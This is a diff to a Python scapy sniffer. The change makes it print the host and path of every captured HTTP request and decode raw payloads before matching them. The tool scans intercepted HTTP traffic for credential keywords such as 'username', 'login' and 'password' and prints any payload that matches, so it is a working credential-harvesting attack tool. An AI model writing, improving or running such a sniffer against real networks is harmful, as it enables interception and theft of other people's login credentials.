@@ -10,11 +10,13 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        url=packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
+        print(url)
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ['email', 'username', 'user', 'login', 'password', 'pass']
             for keyword in keywords:
-                if keyword in load:
+                if keyword in load.decode():
                     print(load)
                     break
 
